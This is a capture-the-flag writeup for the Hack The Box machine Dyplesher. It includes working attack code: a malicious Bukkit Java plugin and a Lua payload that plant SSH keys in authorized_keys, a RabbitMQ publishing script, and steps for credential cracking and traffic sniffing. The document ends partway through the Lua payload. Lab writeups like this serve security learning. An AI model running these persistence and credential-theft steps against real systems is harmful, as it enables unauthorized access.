# Dyplesher HTB writeup

![Dyplesher Image](https://www.hackthebox.eu/storage/avatars/eab2ccffece8cdfa57d0743164b9776e.png)

Dyplesher was my very first Insane Hack The Box machine. Drove me nuts to find an initial foothold and root wasn't much harder than a medium/hard box.

## Enum

Enumeration was the part where I spend most of the time, was overlooking into the wrong places and ignored the correct.

### NMAP results

Below results of NMAP, we can see SSH, HTTP, RabbitMQ, EPMD Memcached and minecraft-server services running, also an unknown service running on port 3000.

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 18:11 CEST
Initiating Ping Scan at 18:11
Scanning 10.10.10.190 [2 ports]
Completed Ping Scan at 18:11, 0.04s elapsed (1 total hosts)
Initiating Connect Scan at 18:11
Scanning 10.10.10.190 [65535 ports]
Discovered open port 22/tcp on 10.10.10.190
Discovered open port 80/tcp on 10.10.10.190
Discovered open port 4369/tcp on 10.10.10.190
Discovered open port 25672/tcp on 10.10.10.190
Discovered open port 25562/tcp on 10.10.10.190
Connect Scan Timing: About 43.48% done; ETC: 18:12 (0:00:40 remaining)
Discovered open port 25565/tcp on 10.10.10.190
Discovered open port 5672/tcp on 10.10.10.190
Discovered open port 3000/tcp on 10.10.10.190
Discovered open port 11211/tcp on 10.10.10.190
Completed Connect Scan at 18:12, 54.76s elapsed (65535 total ports)
Nmap scan report for 10.10.10.190
Host is up (0.038s latency).
Not shown: 65525 filtered ports, 1 closed port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3000/tcp  open  ppp
4369/tcp  open  epmd
5672/tcp  open  amqp
11211/tcp open  memcache
25562/tcp open  unknown
25565/tcp open  minecraft
25672/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 54.82 seconds
```

Result of common nmap scripts against open ports.

```bash
[*] Running NMAP scripts to open ports
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 18:12 CEST
Nmap scan report for 10.10.10.190
Host is up (0.037s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7e:ca:81:78:ec:27:8f:50:60:db:79:cf:97:f7:05:c0 (RSA)
|   256 e0:d7:c7:9f:f2:7f:64:0d:40:29:18:e1:a1:a0:37:5e (ECDSA)
|_  256 9f:b2:4c:5c:de:44:09:14:ce:4f:57:62:0b:f9:71:81 (ED25519)
80/tcp    open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Dyplesher
3000/tcp  open  ppp?
| fingerprint-strings:
|   GenericLines, Help:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=fb94a4c063bb0bd3; Path=/; HttpOnly
|     Set-Cookie: _csrf=iJaOmeRYfWmehMyijQzQEZ3Jk706MTU5MDMzNjc3Njg3Njg2NTM0MA%3D%3D; Path=/; Expires=Mon, 25 May 2020 16:12:56 GMT; HttpOnly
|     Date: Sun, 24 May 2020 16:12:56 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="iJaOmeRYfWmehMyijQzQEZ3Jk706MTU5MDMzNjc3Njg3Njg2NTM0MA==" />
|     <meta name="_suburl" content="" />
|     <meta proper
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=86eefb03b61a9160; Path=/; HttpOnly
|     Set-Cookie: _csrf=HaCJKx5FnpbpoM_whufwZ1x1Nb86MTU5MDMzNjc4MjA4NDk1MTU1MA%3D%3D; Path=/; Expires=Mon, 25 May 2020 16:13:02 GMT; HttpOnly
|     Date: Sun, 24 May 2020 16:13:02 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="HaCJKx5FnpbpoM_whufwZ1x1Nb86MTU5MDMzNjc4MjA4NDk1MTU1MA==" />
|     <meta name="_suburl" content="" />
|_    <meta
4369/tcp  open  epmd       Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|_    rabbit: 25672
5672/tcp  open  amqp       RabbitMQ 3.7.8 (0-9)
| amqp-info:
|   capabilities:
|     publisher_confirms: YES
|     exchange_exchange_bindings: YES
|     basic.nack: YES
|     consumer_cancel_notify: YES
|     connection.blocked: YES
|     consumer_priorities: YES
|     authentication_failure_close: YES
|     per_consumer_qos: YES
|     direct_reply_to: YES
|   cluster_name: rabbit@dyplesher
|   copyright: Copyright (C) 2007-2018 Pivotal Software, Inc.
|   information: Licensed under the MPL.  See http://www.rabbitmq.com/
|   platform: Erlang/OTP 22.0.7
|   product: RabbitMQ
|   version: 3.7.8
|   mechanisms: PLAIN AMQPLAIN
|_  locales: en_US
11211/tcp open  memcache?
25562/tcp open  unknown
25565/tcp open  minecraft?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, LDAPSearchReq, LPDString, SIPOptions, SSLSessionReq, TLSSessionReq, afp, ms-sql-s, oracle-tns:
|     '{"text":"Unsupported protocol version"}
|   NotesRPC:
|     q{"text":"Unsupported protocol version 0, please use one of these versions:
|_    1.8.x, 1.9.x, 1.10.x, 1.11.x, 1.12.x"}
25672/tcp open  unknown
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.97 seconds
```

### Web fuzz results

I first started fuzzing GOGS service, but nothing found so far with with low privileges on it.

After many ours of enumerating all web services with different wordlist, finally got a hit using dirb's common.txt on test.dyplesher.htb

```bash
$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://test.dyplesher.htb/FUZZ -e .txt,.php,.html -t 300 -s

index.php
.hta.txt
.git/HEAD
.htpasswd
server-status
```

## Foothold

Knowing we have a .git on test.dyplesher.htb proceeded to dump all info I can with `gogitdumper`. This tool will download all the git objects and create a new repository in our local machine.

```bash
$ gogitdumper -u http://test.dyplesher.htb/.git/ -o test/.git/
====================
GoGitDumper V0.5.2
Poorly hacked together by C_Sto
====================
Error code: 403

Error during indexing test
Downloaded:  http://test.dyplesher.htb/.git/index
Downloaded:  http://test.dyplesher.htb/.git/objects/info/packs
Downloaded:  http://test.dyplesher.htb/.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391
Downloaded:  http://test.dyplesher.htb/.git/objects/27/29b565f353181a03b2e2edb030a0e2b33d9af0
Downloaded:  http://test.dyplesher.htb/.git/HEAD
Downloaded:  http://test.dyplesher.htb/.git/logs/refs/heads/master
Downloaded:  http://test.dyplesher.htb/.git/config
Downloaded:  http://test.dyplesher.htb/.git/logs/HEAD
Downloaded:  http://test.dyplesher.htb/.git/logs/refs/remotes/origin/master
Downloaded:  http://test.dyplesher.htb/.git/refs/remotes/origin/master
Downloaded:  http://test.dyplesher.htb/.git/refs/heads/master
Downloaded:  http://test.dyplesher.htb/.git/COMMIT_EDITMSG
Downloaded:  http://test.dyplesher.htb/.git/description
Downloaded:  http://test.dyplesher.htb/.git/hooks/applypatch-msg.sample
Downloaded:  http://test.dyplesher.htb/.git/hooks/commit-msg.sample
Downloaded:  http://test.dyplesher.htb/.git/hooks/post-update.sample
Downloaded:  http://test.dyplesher.htb/.git/hooks/pre-applypatch.sample
Downloaded:  http://test.dyplesher.htb/.git/hooks/pre-push.sample
Downloaded:  http://test.dyplesher.htb/.git/hooks/prepare-commit-msg.sample
Downloaded:  http://test.dyplesher.htb/.git/hooks/pre-rebase.sample
Downloaded:  http://test.dyplesher.htb/.git/hooks/pre-commit.sample
Downloaded:  http://test.dyplesher.htb/.git/info/exclude
Downloaded:  http://test.dyplesher.htb/.git/hooks/pre-receive.sample
Downloaded:  http://test.dyplesher.htb/.git/hooks/update.sample
Downloaded:  http://test.dyplesher.htb/.git/objects/b1/fe9eddcdf073dc45bb406d47cde1704f222388
Downloaded:  http://test.dyplesher.htb/.git/objects/3f/91e452f3cbfa322a3fbd516c5643a6ebffc433
```

Once we have the files locally, we can proceed to see its contents, first checking what files are on stage.

```bash
$ cd test
$ git status
On branch master
Your branch is up to date with 'origin/master'.

Changes not staged for commit:
  (use "git add/rm <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
  deleted:    README.md
  deleted:    index.php

no changes added to commit (use "git add" and/or "git commit -a")
```

As we can see, the repo have two removed files, we can undo them using `git checkout --`

```bash
git checkout -- README.md
git checkout -- index.php
```

README.md haven't had any useful information, but index.php showed us an auth connection for memcached on port 11211

```markup
$ cat index.php

<HTML>
<BODY>
<h1>Add key and value to memcache<h1>
<FORM METHOD="GET" NAME="test" ACTION="">
<INPUT TYPE="text" NAME="add">
<INPUT TYPE="text" NAME="val">
<INPUT TYPE="submit" VALUE="Send">
</FORM>

<pre>
<?php
if($_GET['add'] != $_GET['val']){
  $m = new Memcached();
  $m->setOption(Memcached::OPT_BINARY_PROTOCOL, true);
  $m->setSaslAuthData("felamos", "XXXXXXXXXXXXX");
  $m->addServer('127.0.0.1', 11211);
  $m->add($_GET['add'], $_GET['val']);
  echo "Done!";
}
else {
  echo "its equal";
}
?>
</pre>

</BODY>
</HTML>
```

Also we can see the repository pointing to a remote server, this part give us a clue what could be inside Gogs git server.

```bash
$ cat .git/config
[core]
  repositoryformatversion = 0
  filemode = true
  bare = false
  logallrefupdates = true
[remote "origin"]
  url = http://localhost:3000/felamos/memcached.git
  fetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
  remote = origin
  merge = refs/heads/master
fatal: this operation must be run in a work tree
```

### Memcached enumeration

Now that we have memcached credentials, is time to enumerate and find something useful. As the server is using SASL auth, we cannot use netcat nor telnet. So I installed memcached tools and check the status of the server.

```bash
$ memcstat --username felamos --password XXXXXXXXX --servers 10.10.10.190
Server: 10.10.10.190 (11211)
   pid: 1
   uptime: 1756
   time: 1591198925
   version: 1.6.5
   libevent: 2.1.8-stable
     ....
     ....
   lru_bumps_dropped: 0
```

This confirmed credentials worked, now proceed to check slabs

```bash
$ memcstat --username felamos --password XXXXXXXXX --servers 10.10.10.190 --args slabs
Server: 10.10.10.190 (11211)
   1:chunk_size: 96
   1:chunks_per_page: 10922
   1:total_pages: 1
   1:total_chunks: 10922
   1:used_chunks: 1
     ....
     ....
   active_slabs: 4
   total_malloced: 4194304
```

Next is to check how many items are stored in the cache, was 4 items in my case.

```bash
$ memcstat --username felamos --password XXXXXXXXX --servers 10.10.10.190 --args items
Server: 10.10.10.190 (11211)
   items:1:number: 1
     ....
   items:3:number: 1
   ....
   items:5:number: 1
   ....
   items:6:number: 1
     ....
```

Then tried to list the keys, but wasn't able to see then in any way.

At this point tried to guess how the keys would be, tried things like email, user, password.

`username` key worked and gave us 3 users.

```bash
 $ memccat --debug --username felamos --password XXXXXXXXX --servers 10.10.10.190 username
key: username
flags: 0length: 24
value: MinatoTW
felamos
yuntao
```

As username worked, tried password and it worked, giving us 3 bcrypt hashes.

```bash
$ memccat --debug --username felamos --password XXXXXXXXX --servers 10.10.10.190 password
key: password
flags: 0length: 182
value: $2a$10$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxJa
$2y$12$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxQK
$2a$10$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxlS
```

John the ripper gave us 1 password out of the 3 hashes we got.

```bash
$ john passwd.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxxxx           (?)
```

### Gogs

Working password was for felamos user on [http://10.10.10.190:3000](http://10.10.10.190:3000) Gogs service.

Once logged in, we can see there was 2 repositories: memcached with same contents as we downloaded previously in the other web service and a gitlab repository.

We couldn't see anything useful on the repository itself, but there was a release package with a zip file ready to download. [http://10.10.10.190:3000/attachments/a1b0e8bb-5843-4d5a-aff4-c7ee283e95f2](http://10.10.10.190:3000/attachments/a1b0e8bb-5843-4d5a-aff4-c7ee283e95f2)

At this point, once the zip file downloaded and unzipped. We can locally clone the contents of an existing @hashed directory.

```bash
$ git clone ./@hashed/6b/86/6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b.bundle 6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b
Cloning into '6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b'...
Receiving objects: 100% (85/85), 30.69 KiB | 30.69 MiB/s, done.
Resolving deltas: 100% (40/40), done.

$ git clone ./@hashed/d4/73/d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35.bundle d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35
Cloning into 'd4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35'...
Receiving objects: 100% (21/21), 16.98 KiB | 16.98 MiB/s, done.
Resolving deltas: 100% (9/9), done.

$ git clone ./@hashed/4b/22/4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a.bundle 4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a
Cloning into '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a'...
Receiving objects: 100% (39/39), 10.46 KiB | 10.46 MiB/s, done.
Resolving deltas: 100% (12/12), done.

$ git clone ./@hashed/4e/07/4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce.bundle 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce
Cloning into '4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce'...
Receiving objects: 100% (51/51), 20.94 MiB | 102.57 MiB/s, done.
Resolving deltas: 100% (5/5), done.
```

So far, there were 4 repositories. After reviewing them we observed that only 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce had things usefull for us.

Checking over the contents of this repository I've found that there was a DB file with users credentials.

```bash
$ cat 4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce/plugins/LoginSecurity/users.db

�00���ableusersusersCREATE TABLE users (unique_user_id VARCHAR(130) NOT NULL UNIQUE,password VARCHAR(300) NOT NULL,encryption INT,ip VARCHAR(130) NOT NULL))=indexsqlite_autoindex_users_1user��qM�)18fb40a5c8d34f249bb8a689914fcac3$2a$10$Ixxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxc6/192.168.43.81
��$M18fb40a5c8d34f249bb8a689914fcac3%
```

After opening the file with an sqlite browser, decrypted the password with john the ripper.

```bash
$ john db_pass.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xxxxxxxxx          (?)
1g 0:00:00:07 DONE (2020-06-03 20:02) 0.1404g/s 227.5p/s 227.5c/s 227.5C/s xxxxxxxxx..serena
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Bukkit java plugin

The new credential allowed us to login into [http://dyplesher.htb/home/console](http://dyplesher.htb/home/console)

At first tried to upload a jar plugin created by msfvenom, it failed due name too large while loading and also because the plugin requires an specific design for the tool consuming it.

Then looked at `bukkit.yml` in the same repo as `users.db` file which results is a plugin management for minecraft [https://bukkit.gamepedia.com/Main\_Page](https://bukkit.gamepedia.com/Main_Page)

Main site leads us into a how to write plugins guide [https://bukkit.gamepedia.com/Plugin\_Tutorial](https://bukkit.gamepedia.com/Plugin_Tutorial)

Next step is to create a new maven project.

```text
mvn archetype:generate -DgroupId=htb.dyplesher -DartifactId=xnaaro-plug
```

Once the project had a proper design, followed the guide to write plugins and adapted the required parts for bukkit plugins.

First was `pom.xml` file. Below is an example of my configuration.

```markup
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
  <modelVersion>4.0.0</modelVersion>
  <groupId>htb.dyplesher</groupId>
  <artifactId>xnaaro</artifactId>
  <packaging>jar</packaging>
  <version>1.2-SNAPSHOT</version>
  <name>xnaaro</name>
  <url>http://maven.apache.org</url>
  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>3.8.1</version>
      <scope>test</scope>
    </dependency>
       <dependency>
          <groupId>org.bukkit</groupId>
          <artifactId>bukkit</artifactId>
          <version>1.12.2-R0.1-SNAPSHOT</version><!--change this value depending on the version or use LATEST-->
          <type>jar</type>
          <scope>provided</scope>
      </dependency>
      <dependency>
           <groupId>org.spigotmc</groupId>
           <artifactId>spigot-api</artifactId>
           <version>1.12.2-R0.1-SNAPSHOT</version><!--change this value depending on the version-->
           <type>jar</type>
           <scope>provided</scope>
       </dependency>
  </dependencies>
  <properties>
    <maven.compiler.source>1.6</maven.compiler.source>
    <maven.compiler.target>1.6</maven.compiler.target>
</properties>
<repositories>
    <repository>
      <id>bukkit-repo</id>
      <url>https://hub.spigotmc.org/nexus/content/repositories/snapshots/</url>
    </repository>
  </repositories>
  <build>
    <plugins>
      <plugin>
        <!-- Build an executable JAR -->
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-jar-plugin</artifactId>
        <version>3.1.0</version>
        <configuration>
          <archive>
            <manifest>
              <addClasspath>true</addClasspath>
              <classpathPrefix>lib/</classpathPrefix>
              <mainClass>htb.dyplesher.App</mainClass>
            </manifest>
          </archive>
        </configuration>
      </plugin>
    </plugins>
  </build>
</project>
```

Second is `src/main/resources/plugin.yml` file which is where bukkit will read plugin name and what java class will load as main.

```text
name: xnaaro
main: htb.dyplesher.Xnaaro
version: 1.0.2
```

Last file is `src/main/java/htb/dyplesher.Xnaaro.java`. This is the file where the actual java code with our RCE commands will be.

It requires to load JavaPlugin and extends its main class with it.

Our RCE code will be executed while loading/enabling the plugin.

At first tried to get a reverse shell, but it didn't work as expected because there was a firewall in the box blocking outgoing connections.

After enumerating sometime the box, saw the commands were running as MinatoTW user.

So, just added my SSH key into his authorized\_keys file.

```java
package htb.dyplesher;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.FileWriter;
import java.io.IOException;

public class Xnaaro extends JavaPlugin {

    @Override
    public void onDisable() {
        System.out.println ("Plugin disabled");
    }

    @Override
    public void onEnable() {
        try {
            FileWriter myWriter = new FileWriter("/home/MinatoTW/.ssh/authorized_keys");
            myWriter.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+P7qV7kjQ7RaxUNNeAlQkREHCUKW1kXitmHwdrpDZ+MZlfmZmYPJ75A+/m/S6JVS4qi8oCXthZX06j0x1oaGrKAsoYSuMMU+eN40gp+9I2IaPglv0407yL4fJMqy0jnb9ID+g5c+OTTH8q7tQ0wvcFLZpOnnbHVp2Autgb9Plx4fppNAQcHn11VBXTv+e48RKcC44gJULVhqp8eB8lT5O2pT5aHP58s3dggTMn5rwzxK7k6jT638rHNWUM84WhepzQb9dE3NYLX2RRdshBIIfqVeIUZfxWg5fcLjgTfdV7lb4zrJbS9KXH8UWb8NSfM73Pwy3mSFSdtNC59qTZEiN838bBSJbFtcBj8aVHWrdEjowGBzv8yYcrLC7tpFZyHxLsQsenOf/MTUKtqrqQq/tRVwcwhbYHXH2fIcU1x+pEI8qxpLHR64fiynxwrnVP/FSGchvvX3hnzkdDE3g51lvMhpkAxX30aqwd1Hmqs8YRYVA43atczbLo1TaNto3QkU= xnaaro@parrot");
            myWriter.close();
        } catch (IOException e) {
            System.out.println("An error occurred.");
            e.printStackTrace();
        }
    }
}
```

Finally, create a `.jar` package with maven

```bash
mvn package
```

In order to raise the RCE, first we need to upload the plugin package and then enable it in the GUI. In the plugin list the name was a long hash, but using plugin name `xnaaro` in my case, properly executed it.

And we have ssh access to minatotw user.

```bash
$ ssh MinatoTW@10.10.10.190 -i id_rsa
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Wed May 20 13:44:56 2020 from 10.10.14.4
```

## Felamos user

After enumerating a couple of things, saw minato user was in wireshark group.

```bash
MinatoTW@dyplesher:~$ cat /etc/group | grep -i minato
MinatoTW:x:1001:
wireshark:x:122:MinatoTW
```

As there is rabbitmq and memcached running, we may be able to intercept something useful from it.

```bash
MinatoTW@dyplesher:~$ tshark -ni any -w data.pcap
Capturing on 'any'
427
```

Downloaded the `.pcap` file to my local.

```bash
$ scp -i id_rsa MinatoTW@10.10.10.190:data.pcap .
data.pcap                                                   100%   50KB 474.6KB/s   00:00
```

And looked at the contents, we where able to find some auth strings.

```bash
$ tcpick -C -yP -r data2.pcap | grep subscribers
...subscribers.direct......
........2.....sub.subscribers.......
........<.(...subscribers......... .<.............application/json.........{"name":"Mafalda Wuckert I","email":"cheaney@witting.com","address":"84889 Mayert Coves Apt. 784\nEast Tabithahaven, CO 07102","password":"B9YXOT2VmiDh","subscribed":true}.
........<.(...subscribers......... .<.............application/json.........{"name":"Berenice Hill","email":"weimann.janet@langosh.org","address":"237 Frank Trail Suite 931\nDareside, SD 21507","password":"B9YXOT2VmiDh","subscribed":true}.
........<.(...subscribers......... .<.............application/json.........{"name":"Dr. Hailie Gleichner","email":"kihn.beth@yahoo.com","address":"47786 Koelpin Hills\nNew Abigailshire, NC 91337","password":"B9YXOT2VmiDh","subscribed":true}.
........<.(...subscribers......... .<.............application/json.........{"name":"Francis Glover","email":"klemke@oconnell.info","address":"872 Wilton Land\nLauraview, PA 54556","password":"B9YXOT2VmiDh","subscribed":true}.
........<.(...subscribers......... .<.............application/json.........{"name":"Ryann Quigley","email":"osvaldo.oconner@gmail.com","address":"925 Ritchie Harbor\nWest Esperanza, FL 50235-9309","password":"B9YXOT2VmiDh","subscribed":true}.
........<.(...subscribers......... .<.............application/json.........{"name":"Peyton Reynolds","email":"harber.mossie@cruickshank.com","address":"644 Bauch Spur\nNew Mustafa, OH 10892","password":"B9YXOT2VmiDh","subscribed":true}.
........<.(...subscribers......... .<.............application/json.........{"name":"Prof. Catalina Kessler IV","email":"umorar@heathcote.com","address":"8527 Scottie Neck\nPort Charlie, WV 87089","password":"B9YXOT2VmiDh","subscribed":true}.
........<.(...subscribers......... .<.............application/json.........{"name":"Dr. Roselyn Ebert","email":"gracie.klocko@kilback.com","address":"9225 Zulauf Plaza Suite 751\nEast Obiemouth, PA 90425-1897","password":"B9YXOT2VmiDh","subscribed":true}.
........<.(...subscribers......... .<.............application/json.........{"name":"Edgar Osinski","email":"tressa.mills@hotmail.com","address":"92938 Toy Lock Suite 064\nNew Rossie, MT 63835","password":"B9YXOT2VmiDh","subscribed":true}.
........<.(...subscribers......... .<.............application/json.........{"name":"Gennaro Romaguera","email":"denesik.salvador@yahoo.com","address":"39874 Serena Extensions Apt. 100\nEmanuelborough, MD 38535-4626","password":"B9YXOT2VmiDh","subscribed":true}.
........<.(...subscribers......... .<.............application/json.........{"name":"Gennaro Romaguera","email":"denesik.salvador@yahoo.com","address":"39874 Serena Extensions Apt. 100\nEmanuelborough, MD 38535-4626","password":"B9YXOT2VmiDh","subscribed":true}.
........<.(...subscribers......... .<.........q...application/json........q{"name":"MinatoTW","email":"MinatoTW@dyplesher.htb","address":"India","password":"bixxxxxxFov","subscribed":true}.
........<.(...subscribers......... .<.........l...application/json........l{"name":"yuntao","email":"yuntao@dyplesher.htb","address":"Italy","password":"waxxxxxxob","subscribed":true}.
........<.(...subscribers......... .<.........p...application/json........p{"name":"felamos","email":"felamos@dyplesher.htb","address":"India","password":"tixxxxxxxxxg","subscribed":true}.
```

Credentials worked for felamos and yuntao users.

```bash
$ ssh felamos@10.10.10.190
felamos@10.10.10.190's password:
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 05 Jun 2020 02:39:08 PM UTC

  System load:  0.0               Processes:              254
  Usage of /:   6.9% of 97.93GB   Users logged in:        1
  Memory usage: 33%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Thu Apr 23 17:33:41 2020 from 192.168.0.103
felamos@dyplesher:~$ id
uid=1000(felamos) gid=1000(felamos) groups=1000(felamos)
felamos@dyplesher:~$ cat user.txt
a2ff93xxxxxxxxxxxxxxxxxxx
```

## Cuberite

Once inside felamos `$HOME` directory we can see a file with some information on what to focus and how to do it.

It refers to some service that read on the rabbitmq queues and open an URL.

```bash
felamos@dyplesher:~$ cat yuntao/send.sh
#!/bin/bash

echo 'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.' >  /dev/pts/{}
```

Checking running processes we can observe an interesting one executing something called Cuberite.

```bash
felamos@dyplesher:/etc$ ps a
  PID TTY      STAT   TIME COMMAND
  995 tty1     Ss+    0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
 1017 pts/1    Ssl+   0:18 /home/MinatoTW/Cuberite/Cuberite
 1026 pts/2    Ssl+   2:47 /usr/bin/java -Xms512M -Xmx512M -jar paper.jar
 2167 pts/0    Ss+    0:00 /usr/bin/php /root/work/com.php
 3657 pts/4    Ss     0:00 -bash
 4594 pts/4    S      0:00 bash
20468 pts/4    R+     0:00 ps a
```

Investigated a bit what the services was doing and what languages uses it, found out that the plugins were written with `lua` programming language. [https://book.cuberite.org/\#0.1](https://book.cuberite.org/#0.1)

At first tried to read queues, but auth was required. Looking at the previous captured `.pcap` file, I was able to see another credential for AMQP.

```bash
. .....capabilitiesF.....publisher_confirmst..exchange_exchange_bindingst.
basic.nackt..consumer_cancel_notifyt..connection.blockedt..consumer_prioritiest..authentication_failure_closet..per_consumer_qost..direct_reply_tot..cluster_nameS....rabbit@dyplesher  copyrightS....Copyright (C) 2007-2018 Pivotal Software, Inc..informationS...5Licensed under the MPL.  See http://www.rabbitmq.com/.platformS....Erlang/OTP 22.0.7.productS....RabbitMQ.versionS....3.7.8....PLAIN AMQPLAIN....en_US.
......=.
.......productS....AMQPLib.platformS....PHP.versionS....2.11.1.informationS.... copyrightS.....capabilitiesF.....authentication_failure_closet..publisher_confirmst..consumer_cancel_notifyt..exchange_exchange_bindingst.
ExxxxxxxxxxxOp.en_US.ion.blockedt..AMQPLAIN...,.LOGINS....yuntao.PASSWORDS...
```

Then wrote a python script to connect rabbitmq and send a message into the queue. Used this guide to write the code [https://www.rabbitmq.com/tutorials/tutorial-one-python.html](https://www.rabbitmq.com/tutorials/tutorial-one-python.html)

Cuberite was expecting an URL in the message and outgoing connections was blocked by the firewall.

Our only option was to use a hosted service inside the box and point the URL to localhost.

```python
import pika
credentials = pika.PlainCredentials('yuntao', 'Exxxxxxxxxxxxp')
parameters = pika.ConnectionParameters('10.10.10.190', 5672, '/', credentials)
connection = pika.BlockingConnection(parameters)
body = 'http://127.0.0.1:4443/exploit.lua'
channel = connection.channel()

channel.queue_declare(queue='plugin_data',
                      durable=True)

channel.basic_publish(exchange='',
                      routing_key='plugin_data',
                      body=body)
connection.close()
```

Contents of the lua exploit inside the box.

Method was the same as for the low privileged shell, copy our SSH key into root's authorized\_keys

```lua
file = io.open("/root/.ssh/authorized_keys", "w")
